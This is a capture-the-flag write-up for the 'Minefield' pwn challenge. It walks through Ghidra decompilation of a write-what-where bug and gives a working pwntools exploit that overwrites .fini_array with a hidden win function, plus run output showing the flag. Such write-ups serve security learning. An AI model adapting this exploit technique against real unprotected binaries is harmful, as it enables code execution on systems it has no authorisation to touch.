# Cyber Apocalypse 2021

## Minefield

> We found one of the core power plants that drain all of our resources. One member of our team is an expert at mines. Plant the correct type of mine at the correct location to blow up the entire power plant, but be careful, otherwise we are all doomed!
> 
> This challenge will raise 33 euros for a good cause.
>
> [`pwn_mindfield.zip`](`pwn_mindfield.zip`)

Tags: _pwn_ _x86-64_ _write-what-where_


## Summary

One-shot _write-what-where_ to overwrite `.fini_array` with _win_ function.

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No RELRO--every time it's `.fini_array`.

Basically overwrite `.fini_array` with a _win_ function if it exists (or grow your own).


### Decompile with Ghidra

```c
void mission(undefined8 param_1,void *param_2,undefined8 param_3,char *param_4,int param_5, int param_6)
{
  ulonglong *puVar1;
  ulonglong uVar2;
  int extraout_EDX;
  int extraout_EDX_00;
  void *pvVar3;
  long in_FS_OFFSET;
  char local_24 [10];
  char local_1a [10];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Insert type of mine: ");
  r(local_24,param_2,extraout_EDX,param_4,param_5,param_6);
  pvVar3 = (void *)0x0;
  puVar1 = (ulonglong *)strtoull(local_24,(char **)0x0,0);
  printf("Insert location to plant: ");
  r(local_1a,pvVar3,extraout_EDX_00,param_4,param_5,param_6);
  puts("We need to get out of here as soon as possible. Run!");
  uVar2 = strtoull(local_1a,(char **)0x0,0);
  *puVar1 = uVar2;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

`*puVar1 = uVar2;` is a _write-what-where_.

```
void _(void)
{
  long lVar1;
  size_t __n;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __n = strlen(&DAT_00400ccc);
  write(1,&DAT_00400ccc,__n);
  system("cat flag*");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

And there's the _win_ function.  I actually missed this in Ghidra; why I always run `objdump -M intel -d` as well.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./minefield')

if args.REMOTE:
    p = remote('206.189.121.131',32732)
else:
    p = process(binary.path)

p.sendlineafter('> ','2')
p.sendlineafter('mine: ',hex(binary.get_section_by_name('.fini_array').header.sh_addr))
p.sendlineafter('plant: ',hex(binary.sym._))
print(p.recvuntil('}').decode())
```

Overwrite `.fini_array` with the location of the function `_`.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/cyberapocalypsectf2021/mindfield/minefield'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 206.189.121.131 on port 32732: Done
We need to get out of here as soon as possible. Run!

Mission accomplished! ✔
CHTB{d3struct0r5_m1n3f13ld}
```
